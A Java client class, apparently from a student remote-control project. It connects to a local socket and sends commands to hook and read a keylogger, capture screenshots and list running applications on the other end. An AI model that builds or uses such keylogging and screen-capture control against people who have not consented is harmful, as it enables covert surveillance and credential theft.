package model;

import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

public class Client
{
    public Client()
    {
        initComponents();
    }

    private void initComponents()
    {
        //
    }

    public String createSocket()
    {
        try
        {
            sock = new Socket(InetAddress.getLocalHost(), 9999);

            inputStream = sock.getInputStream();
            outputStream = sock.getOutputStream();
            process = new Process(sock, inputStream, outputStream);
            keylogger = new Keylogger(inputStream, outputStream);
            screenShot = new Screenshot(inputStream, outputStream);
        }
        catch (Exception e)
        {
            return e.toString();
        }

        return "Success";
    }

    public void setIP(String IP) {
        this.IP = IP;
    }

    public BufferedImage handleScreenShot(String command)
    {
        sendCommand(command);

        return screenShot.takeScreenshot();
    }

    public String handleKeyLogger(String command)
    {
        try
        {
            byte[] msg = command.getBytes();
            outputStream.write(msg);

            switch(command)
            {
                case "Hook":
                    keylogger.handleHook();
                    break;
                case "Unhook":
                    keylogger.handleUnHook();
                    break;
                case "Print":
                    return keylogger.handlePrint();
            }
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }

        return keylogger.getKeylogging();
    }

    public Screenshot getScreenShot() {
        return screenShot;
    }

    public Process getProcess() {
        return process;
    }

    public Keylogger getKeylogger() {
        return keylogger;
    }

    public void handleApp(String command)
    {
        try
        {
            sock.setSoTimeout(1500);
            byte[] msg = command.getBytes();
            outputStream.write(msg);

            if (command.equals("ListApp"))
            {
                byte[] buffer = new byte[1024];
                inputStream.read(buffer);
                String infoLine = new String(buffer, StandardCharsets.UTF_8);
                System.out.println("vcvc");
                while (true)
                {
                    inputStream.read(buffer);
                    infoLine = new String(buffer, StandardCharsets.UTF_8);
                    infoLine = infoLine.trim();

                    ArrayList<String> tempArray = new ArrayList<>();
                    System.out.println(infoLine);
                }
            }
        }
        catch (IOException ioE)
        {
            //
        }
    }

    public void sendCommand(String command)
    {
        try
        {
            byte[] msg = command.getBytes();
            outputStream.write(msg);
        }
        catch (IOException ioE)
        {
            //
        }
    }

    private Boolean isHook = false;
    private Socket sock;
    private String IP;
    private InputStream inputStream;
    private OutputStream outputStream;
    private Process process;
    private Keylogger keylogger;
    private Screenshot screenShot;
}